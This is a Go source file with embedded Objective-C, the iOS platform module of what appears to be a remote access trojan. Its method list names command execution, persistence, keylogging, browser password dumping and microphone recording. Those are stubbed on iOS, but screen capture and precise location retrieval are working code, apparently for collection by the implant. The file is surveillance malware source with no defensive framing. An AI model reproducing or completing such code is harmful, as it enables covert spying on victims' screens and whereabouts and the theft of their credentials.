//go:build ios

package ios

/*
#cgo CFLAGS: -x objective-c -fobjc-arc
#cgo LDFLAGS: -framework UIKit -framework Foundation -framework CoreGraphics -framework CoreLocation

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>
#import <stdlib.h>
#import <string.h>

typedef struct {
    void* data;
    int length;
} ImageData;

ImageData TakeScreenshot() {
    __block NSData *pngData = nil;

    // UI operations must run on the main thread
    dispatch_sync(dispatch_get_main_queue(), ^{
        UIScreen *screen = [UIScreen mainScreen];
        UIWindow *window = nil;

        // Try to find the key window safely
        if (@available(iOS 13.0, *)) {
            for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
                if (scene.activationState == UISceneActivationStateForegroundActive) {
                    for (UIWindow *w in scene.windows) {
                        if (w.isKeyWindow) {
                            window = w;
                            break;
                        }
                    }
                }
                if (window) break;
            }
        }

        // Fallback for older iOS or if scene logic fails
        if (!window) {
            window = [[UIApplication sharedApplication] keyWindow];
        }

        // Last resort: just pick the first window
        if (!window) {
             NSArray *windows = [[UIApplication sharedApplication] windows];
             if ([windows count] > 0) {
                 window = [windows firstObject];
             }
        }

        if (!window) return;

        CGRect rect = [screen bounds];
        UIGraphicsBeginImageContextWithOptions(rect.size, NO, 0);
        [window drawViewHierarchyInRect:rect afterScreenUpdates:YES];
        UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
        UIGraphicsEndImageContext();

        pngData = UIImagePNGRepresentation(image);
    });

    ImageData result;
    result.data = NULL;
    result.length = 0;

    if (pngData) {
        result.length = (int)[pngData length];
        result.data = malloc(result.length);
        if (result.data) {
            memcpy(result.data, [pngData bytes], result.length);
        }
    }

    return result;
}

void FreeImageData(void* ptr) {
    free(ptr);
}

// Location Implementation

typedef struct {
    double latitude;
    double longitude;
    char* error;
} LocationResult;

@interface LocationDelegate : NSObject <CLLocationManagerDelegate>
@property (nonatomic, strong) CLLocationManager *locationManager;
@property (nonatomic, strong) CLLocation *location;
@property (nonatomic, strong) NSError *error;
@end

@implementation LocationDelegate

- (instancetype)init {
    self = [super init];
    if (self) {
        self.locationManager = [[CLLocationManager alloc] init];
        self.locationManager.delegate = self;
        self.locationManager.desiredAccuracy = kCLLocationAccuracyBest;
    }
    return self;
}

- (void)start {
    [self.locationManager requestWhenInUseAuthorization];
    [self.locationManager requestLocation];
}

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    self.location = [locations lastObject];
    CFRunLoopStop(CFRunLoopGetCurrent());
}

- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
    self.error = error;
    CFRunLoopStop(CFRunLoopGetCurrent());
}

@end

LocationResult GetLocationInternal() {
    LocationResult result;
    result.latitude = 0;
    result.longitude = 0;
    result.error = NULL;

    LocationDelegate *delegate = [[LocationDelegate alloc] init];

    // Safety timeout (10 seconds)
    [NSTimer scheduledTimerWithTimeInterval:10.0 repeats:NO block:^(NSTimer *timer) {
        CFRunLoopStop(CFRunLoopGetCurrent());
    }];

    [delegate start];

    // Run the loop. This blocks until CFRunLoopStop is called (by delegate or timer).
    CFRunLoopRun();

    if (delegate.error) {
        const char *errStr = [[delegate.error localizedDescription] UTF8String];
        result.error = strdup(errStr);
    } else if (delegate.location) {
        result.latitude = delegate.location.coordinate.latitude;
        result.longitude = delegate.location.coordinate.longitude;
    } else {
        result.error = strdup("Location request timed out or failed silently");
    }

    return result;
}

*/
import "C"
import (
	"encoding/json"
	"fmt"
	"unsafe"
)

// IOSPlatform represents the iOS platform.
type IOSPlatform struct{}

// NewPlatform returns a new instance of the IOSPlatform.
func NewPlatform() *IOSPlatform {
	return &IOSPlatform{}
}

// ExecuteCommand executes a command on iOS.
func (p *IOSPlatform) ExecuteCommand(command string) ([]byte, error) {
	return nil, fmt.Errorf("command execution not implemented for iOS")
}

// InstallPersistence does nothing on iOS.
func (p *IOSPlatform) InstallPersistence() (string, error) {
	return "Persistence not implemented for iOS.", nil
}

// Init does nothing on iOS.
func (p *IOSPlatform) Init() error {
	return nil
}

// StartKeylogger does nothing on iOS.
func (p *IOSPlatform) StartKeylogger() {}

// GetKeylogs does nothing on iOS.
func (p *IOSPlatform) GetKeylogs() string {
	return "Keylogger not implemented for iOS."
}

// DumpBrowsers does nothing on iOS.
func (p *IOSPlatform) DumpBrowsers() string {
	return "Browser password dumping not implemented for iOS."
}

// Screenshot captures the screen on iOS.
func (p *IOSPlatform) Screenshot() ([]byte, error) {
	imgData := C.TakeScreenshot()
	if imgData.data == nil || imgData.length == 0 {
		return nil, fmt.Errorf("failed to take screenshot")
	}
	defer C.FreeImageData(imgData.data)

	return C.GoBytes(imgData.data, C.int(imgData.length)), nil
}

// RecordMicrophone does nothing on iOS.
func (p *IOSPlatform) RecordMicrophone() ([]byte, error) {
	return nil, fmt.Errorf("microphone recording not implemented for iOS")
}

// GetLocation returns the current location coordinates.
func (p *IOSPlatform) GetLocation() ([]byte, error) {
	res := C.GetLocationInternal()
	if res.error != nil {
		defer C.free(unsafe.Pointer(res.error))
		return nil, fmt.Errorf("%s", C.GoString(res.error))
	}

	loc := struct {
		Latitude  float64 `json:"latitude"`
		Longitude float64 `json:"longitude"`
	}{
		Latitude:  float64(res.latitude),
		Longitude: float64(res.longitude),
	}

	return json.Marshal(loc)
}
